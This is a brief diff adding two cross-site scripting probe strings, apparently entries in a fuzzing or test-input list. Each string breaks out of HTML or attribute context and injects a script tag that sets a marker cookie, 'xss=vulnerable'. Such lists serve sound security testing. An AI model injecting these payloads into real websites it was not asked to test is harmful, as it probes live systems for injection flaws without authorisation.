@@ -1,0 +1,3 @@
+'';!--"<script>document.cookie="xss=vulnerable;"</script>=&{()}
+>"><script>document.cookie="xss=vulnerable;"</script>&
+
